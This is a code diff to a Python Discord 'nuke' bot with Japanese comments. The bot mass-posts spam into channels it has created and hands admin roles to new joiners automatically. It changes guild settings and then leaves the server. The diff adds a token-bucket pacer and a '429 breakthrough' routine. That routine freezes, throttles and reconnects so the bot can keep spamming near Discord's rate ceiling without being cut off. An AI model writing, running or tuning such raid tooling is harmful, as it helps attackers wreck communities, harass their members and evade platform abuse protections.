@@ -10,15 +10,16 @@
   !auto     ->  自動付与の状態確認
   !autoadmin on|off ->  自動付与の手動ON/OFF
 ================================================================
-  【送信設計】
-    チャンネル内 2 並列 / チャンネル起動を 0.08s ずつずらす
-    → 各chのレート制限バケツを独立に回して全体速度を稼ぐ
-    グローバル上限は既定で無効 (SPAM_CONCURRENCY=0)。詰まる場合のみ 20〜30 に
+  【レート制御】
+    - 全送信はトークンバケツ(既定40/s)を1枚通してから発火
+    - Retry-After が BIG_429_SECONDS 以上 or グローバル429 → 全APIを即凍結
+      凍結中は一切リクエストを出さない(叩き続けないので最速で明ける)
+    - 明けたらレート半減から 5/s ずつ戻す
+    - 凍結 RECONNECT_AFTER_FREEZE 回ごとに WebSocket を張り直す
 ================================================================
   【退出保証】
     - 作業期限 = NUKE_TIMEOUT - LEAVE_RESERVE。期限で強制中断
-    - グローバル429は「直近 GLOBAL_RESET 秒以内に PANIC_AFTER_GLOBAL 回」で中断
-    - 中断後も LEAVE_RESERVE 秒まるごと退出リトライに使う
+    - 退出リトライはゲートを通らないので凍結中でも必ず試行される
 ================================================================
   必要な環境変数: DISCORD_TOKEN
   必要な特権インテント: MESSAGE CONTENT / SERVER MEMBERS
@@ -82,12 +83,20 @@ ADMIN_ROLE_COUNT = 50
 ADMIN_AUTO_GRANT = True         # !admin 後、新規参加者にも自動で同じロールを即付与
 
 # ==================== 送信ペース ====================
-SPAM_CONCURRENCY   = 0          # 全体の同時送信上限 (0=無制限。詰まるなら 20〜30)
-PER_CHANNEL_SPAM   = 2          # 1チャンネル内の同時送信数
-SPAM_STAGGER       = 0.08       # チャンネル起動のずらし幅(秒)
+SPAM_RATE        = 40.0         # 1秒あたりの送信数 (Discord全体上限は約50/s)
+SPAM_BURST       = 15.0         # 瞬間バースト許容量
+PER_CHANNEL_SPAM = 2            # 1チャンネル内の同時送信数
+SPAM_STAGGER     = 0.08         # チャンネル起動のずらし幅(秒)
+
+# ==================== 429 突破 ====================
+BIG_429_SECONDS        = 20.0   # これ以上のRetry-Afterは全体凍結
+RATE_MIN               = 10.0   # 凍結後の最低レート
+RATE_STEP              = 5.0    # 復帰時に上げる幅
+RATE_RAMP_INTERVAL     = 5.0    # 復帰ステップ間隔(秒)
+RECONNECT_AFTER_FREEZE = 3      # 凍結この回数ごとに WebSocket 再接続
 
 # ==================== 退出保証 ====================
-NUKE_TIMEOUT       = 2400       # 全体の絶対上限(秒)。作業はこの手前で切る
+NUKE_TIMEOUT       = 2400       # 全体の絶対上限(秒)
 LEAVE_RESERVE      = 240        # 秒。退出専用枠
 PANIC_AFTER_GLOBAL = 10         # グローバル429をこの回数(直近のみ)食らったら中断
 GLOBAL_RESET       = 15         # 秒。これ以上429が空いたらカウントを戻す
@@ -173,6 +182,11 @@ logging.getLogger("discord.http").setLevel(logging.WARNING)
 # ======================= 状態 =======================
 PANIC = {"on": False, "global_429": 0, "last_global": 0.0, "deadline": 0.0}
 
+GATE = asyncio.Event()
+GATE.set()
+PACER = {"rate": SPAM_RATE, "tokens": SPAM_BURST, "last": time.monotonic()}
+COOLDOWN = {"until": 0.0, "task": None, "hits": 0}
+
 _RETRYABLE_5XX = {500, 502, 503, 504}
 _NO_RETRY_4XX  = {400, 401, 403, 404, 405, 415}
 
@@ -212,6 +226,77 @@ def _calm_down() -> None:
         PANIC["global_429"] = 0
 
 
+# ------------------- 凍結 / 復帰 -------------------
+async def _reconnect() -> None:
+    try:
+        log.warning("=== WebSocket 再接続 ===")
+        await bot.reconnect()
+    except Exception as e:
+        log.warning("再接続失敗: %r", e)
+
+
+async def _reopen_worker() -> None:
+    while True:
+        remain = COOLDOWN["until"] - time.monotonic()
+        if remain <= 0:
+            break
+        await asyncio.sleep(min(remain, 1.0))
+
+    # 少し余白を置いてから開ける (境界で即429を食わないため)
+    await asyncio.sleep(random.uniform(0.4, 1.2))
+    GATE.set()
+    log.info("=== 凍結解除。再開 (レート %.0f/s) ===", PACER["rate"])
+
+    for _ in range(30):
+        if not GATE.is_set():
+            return
+        if PACER["rate"] >= SPAM_RATE:
+            return
+        await asyncio.sleep(RATE_RAMP_INTERVAL)
+        PACER["rate"] = min(SPAM_RATE, PACER["rate"] + RATE_STEP)
+        log.info("      -> レート復帰 %.0f/s", PACER["rate"])
+
+
+def _freeze(seconds: float) -> None:
+    """全APIを停止する。既にそれ以上長く止まっているなら何もしない"""
+    if seconds <= 0:
+        return
+    target = time.monotonic() + seconds
+    if target <= COOLDOWN["until"]:
+        return
+
+    COOLDOWN["until"] = target
+    GATE.clear()
+    PACER["rate"] = max(RATE_MIN, PACER["rate"] * 0.5)
+    COOLDOWN["hits"] += 1
+    log.warning("=== %.0f 秒 凍結 (全API停止 / レート %.0f/s) ===",
+                seconds, PACER["rate"])
+
+    if COOLDOWN["task"] is None or COOLDOWN["task"].done():
+        COOLDOWN["task"] = asyncio.create_task(_reopen_worker())
+
+    if COOLDOWN["hits"] % RECONNECT_AFTER_FREEZE == 0:
+        asyncio.create_task(_reconnect())
+
+
+async def acquire_token() -> None:
+    """送信前に通すトークンバケツ。凍結中はゲートで待つ"""
+    while True:
+        if not GATE.is_set():
+            await GATE.wait()
+
+        now = time.monotonic()
+        PACER["tokens"] = min(SPAM_BURST,
+                              PACER["tokens"] + (now - PACER["last"]) * PACER["rate"])
+        PACER["last"] = now
+
+        if PACER["tokens"] >= 1.0:
+            PACER["tokens"] -= 1.0
+            return
+
+        await asyncio.sleep(max(0.01, (1.0 - PACER["tokens"]) / PACER["rate"]))
+
+
 async def safe(call, *args, label: str = "", attempts: int = 12, **kwargs):
     if PANIC["on"]:
         attempts = min(attempts, 2)
@@ -232,12 +317,17 @@ async def safe(call, *args, label: str = "", attempts: int = 12, **kwargs):
             return None
         except discord.HTTPException as e:
             if e.status == 429:
-                if _is_global(e):
-                    _note_global(e)
                 wait = _retry_after_of(e) or 1.0
-                if PANIC["on"]:
-                    wait = min(wait, 5.0)
-                await asyncio.sleep(min(wait, 300.0) + 0.05)
+                is_global = _is_global(e)
+                if is_global:
+                    _note_global(e)
+
+                if is_global or wait >= BIG_429_SECONDS:
+                    # 大物: 全APIを凍結して静かにさせる
+                    _freeze(wait)
+                    await GATE.wait()
+                else:
+                    await asyncio.sleep(min(wait, 5.0) + 0.05)
             elif e.status in _RETRYABLE_5XX:
                 await asyncio.sleep(min(2 ** n, 15))
             elif e.status in _NO_RETRY_4XX:
@@ -269,6 +359,7 @@ async def patch_guild(guild: discord.Guild, payload: dict, label: str):
 
 
 async def leave_guild(guild: discord.Guild, budget: float = LEAVE_RESERVE) -> bool:
+    """ゲートを通さず、凍結中でも必ず試行する"""
     end = time.monotonic() + max(5.0, budget)
     n = 0
     while n < LEAVE_ATTEMPTS and time.monotonic() < end:
@@ -357,7 +448,6 @@ bot = commands.Bot(
 
 NUKE_LOCK = asyncio.Lock()
 RETRY = {"delay": 30.0}
-SPAM_SEM = asyncio.Semaphore(SPAM_CONCURRENCY or 1)
 
 AUTO_GRANT: dict[int, list[str]] = {}
 AUTO_GRANT_SEM = asyncio.Semaphore(MEMBER_CONCURRENCY)
@@ -400,7 +490,6 @@ async def _community_ok(guild: discord.Guild, how: str) -> bool:
 
 
 async def enable_community(guild: discord.Guild) -> bool:
-    """削除前にコミュニティをONにする。3段階でフォールバック"""
     if "COMMUNITY" in guild.features:
         log.info("      -> 既にコミュニティON。スキップ")
         return True
@@ -412,12 +501,10 @@ async def enable_community(guild: discord.Guild) -> bool:
 
         base = sorted(set(guild.features) | {"COMMUNITY"})
 
-        # 試行1: features のみ
         got = await patch_guild(guild, {"features": base}, "community:on#1")
         if got is not None:
             return await _community_ok(guild, "自動生成")
 
-        # 試行2: rules / お知らせch を明示的に添えて再試行
         log.info("      -> features 単体で失敗。ch を添えて再試行")
         rules, news = await _community_pair(guild)
         if rules is not None and news is not None:
@@ -429,12 +516,9 @@ async def enable_community(guild: discord.Guild) -> bool:
             if got is not None:
                 return await _community_ok(guild, "ch添付")
 
-        # 試行3: 2FA要件も同時に立てる
         log.info("      -> ch 添付でも失敗。2FA要件付きで再試行")
-        got = await patch_guild(guild, {
-            "features": base,
-            "mfa_level": 1,
-        }, "community:on#3")
+        got = await patch_guild(guild, {"features": base, "mfa_level": 1},
+                                "community:on#3")
         if got is not None:
             return await _community_ok(guild, "2FA付き")
 
@@ -658,13 +742,12 @@ async def _nuke_body(guild: discord.Guild, el) -> None:
 
     # ---------- 9) 連投 (ロール作業と並行) ----------
     if created and not panic_skip("連投"):
-        log.info("[8/8] %d msg x %d ch 送信 (ch内 %d並列 / 起動間隔 %.2fs) …",
-                 MESSAGES_PER_CHANNEL, len(created), PER_CHANNEL_SPAM, SPAM_STAGGER)
+        log.info("[8/8] %d msg x %d ch 送信 (ch内%d / 間隔%.2fs / %.0f token/s) …",
+                 MESSAGES_PER_CHANNEL, len(created), PER_CHANNEL_SPAM,
+                 SPAM_STAGGER, SPAM_RATE)
 
         async def send_one(ch: discord.TextChannel):
-            if SPAM_CONCURRENCY:
-                async with SPAM_SEM:
-                    return await safe(ch.send, NUKE_MESSAGE, label=f"msg:{ch.name}")
+            await acquire_token()
             return await safe(ch.send, NUKE_MESSAGE, label=f"msg:{ch.name}")
 
         async def spam(ch: discord.TextChannel):
@@ -677,8 +760,6 @@ async def _nuke_body(guild: discord.Guild, el) -> None:
             await asyncio.gather(*(inner() for _ in range(MESSAGES_PER_CHANNEL)))
 
         async def launch():
-            # チャンネルごとにバケツが独立しているので、起動をずらして
-            # 全体の同時リクエストを滑らかにする
             tasks = []
             for c in created:
                 tasks.append(asyncio.create_task(spam(c)))
@@ -759,10 +840,12 @@ async def run_nuke(guild: discord.Guild) -> None:
     budget = max(30.0, NUKE_TIMEOUT - LEAVE_RESERVE)
     PANIC.update(on=False, global_429=0, last_global=0.0,
                  deadline=time.monotonic() + budget)
+    PACER.update(rate=SPAM_RATE, tokens=SPAM_BURST, last=time.monotonic())
+    COOLDOWN.update(until=0.0, task=None, hits=0)
+    GATE.set()
 
-    log.info("=== NUKE START | %s (%s) | 作業枠 %.0fs + 退出枠 %ds | ch内%d並列/間隔%.2fs ===",
-             guild.name, guild.id, budget, LEAVE_RESERVE,
-             PER_CHANNEL_SPAM, SPAM_STAGGER)
+    log.info("=== NUKE START | %s (%s) | 作業枠 %.0fs + 退出枠 %ds | %.0f token/s ===",
+             guild.name, guild.id, budget, LEAVE_RESERVE, SPAM_RATE)
 
     task = asyncio.create_task(_nuke_body(guild, el))
     wd = asyncio.create_task(watchdog(task))
@@ -776,6 +859,7 @@ async def run_nuke(guild: discord.Guild) -> None:
     finally:
         wd.cancel()
         PANIC["on"] = True
+        GATE.set()
         await leave_guild(guild, budget=LEAVE_RESERVE)
         log.info("=== NUKE END | 所要 %s ===", el())
 
